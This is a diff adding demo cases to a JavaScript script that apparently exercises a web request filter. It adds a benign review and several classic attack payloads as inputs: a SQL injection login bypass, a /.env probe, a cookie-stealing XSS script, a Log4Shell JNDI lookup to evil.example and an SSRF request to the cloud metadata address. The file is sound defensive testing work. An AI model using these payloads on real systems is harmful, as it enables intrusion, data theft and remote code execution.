@@ -54,6 +54,35 @@ show('AI crawler harvesting the catalog', shield.evaluate({
   headers: { 'user-agent': 'Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)' },
 }));
 
+show('Customer writes a normal review', shield.evaluate({
+  ip: '203.0.113.10', method: 'POST', path: '/api/reviews', headers: BROWSER,
+  bodyText: JSON.stringify({ text: 'Great quality, I select this shop every time.' }),
+}));
+
+show('SQL injection against the login form', shield.evaluate({
+  ip: '198.51.100.23', method: 'POST', path: '/login', headers: BROWSER,
+  bodyText: JSON.stringify({ email: "admin' OR 1=1 --", password: 'whatever' }),
+}));
+
+show('Hacker probing for the secrets file', shield.evaluate({
+  ip: '198.51.100.24', method: 'GET', path: '/.env', headers: BROWSER,
+}));
+
+show('XSS planted in a product review', shield.evaluate({
+  ip: '198.51.100.25', method: 'POST', path: '/api/reviews', headers: BROWSER,
+  bodyText: JSON.stringify({ text: '<script>alert(document.cookie)</script>' }),
+}));
+
+show('Log4Shell-style JNDI attack', shield.evaluate({
+  ip: '198.51.100.26', method: 'POST', path: '/api/chat', headers: BROWSER,
+  bodyText: JSON.stringify({ name: '${jndi:ldap://evil.example/Exploit}' }),
+}));
+
+show('SSRF aimed at the cloud metadata service', shield.evaluate({
+  ip: '198.51.100.27', method: 'POST', path: '/api/fetch-image', headers: BROWSER,
+  bodyText: JSON.stringify({ url: 'http://169.254.169.254/latest/meta-data/' }),
+}));
+
 console.log('');
 const floodShield = new Shield({ rate: { capacity: 5, refillPerSec: 0.01 } });
 let last;
